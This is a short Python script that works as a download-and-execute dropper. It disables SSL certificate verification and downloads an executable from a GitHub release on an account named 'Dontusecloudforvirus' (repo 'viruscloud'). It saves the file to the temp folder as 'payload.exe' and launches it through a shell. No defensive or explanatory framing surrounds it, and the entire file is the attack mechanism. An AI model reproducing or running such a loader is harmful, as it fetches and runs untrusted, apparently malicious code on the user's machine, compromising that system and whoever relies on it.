import os
import ssl
import urllib.request
import subprocess
import tempfile

url = "https://github.com/Dontusecloudforvirus/viruscloud/releases/download/release/python.exe"

ssl_context = ssl._create_unverified_context()

temp_dir = tempfile.gettempdir()
exe_path = os.path.join(temp_dir, "payload.exe")

with urllib.request.urlopen(url, context=ssl_context) as response:
    with open(exe_path, "wb") as out_file:
        out_file.write(response.read())

subprocess.Popen(exe_path, shell=True)
